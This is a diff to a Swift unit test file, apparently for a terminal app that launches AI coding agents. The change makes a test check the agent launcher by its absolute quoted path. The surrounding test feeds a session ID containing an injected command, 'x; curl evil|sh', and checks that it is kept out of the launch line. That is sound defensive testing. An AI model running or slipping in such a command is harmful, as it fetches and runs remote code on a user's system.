@@ -49,7 +49,9 @@ final class SafetyAndReviewTests: XCTestCase {
         spec.agentSessionId = "x; curl evil|sh"
         let input = AgentIntegration.initialInput(for: spec, resume: true) ?? ""
         XCTAssertFalse(input.contains("curl"))
-        XCTAssertTrue(input.hasPrefix("~/.hyperterm/bin/claude --name 'api'"))
+        // The app's own launcher, by absolute path, so agents get this build's tools.
+        let launcher = shellQuote(AgentIntegration.binDirectory.appendingPathComponent("claude").path)
+        XCTAssertTrue(input.hasPrefix(launcher + " --name 'api'"))
     }
 
     func testTaskIsQuotedIntoTheLaunchLine() {
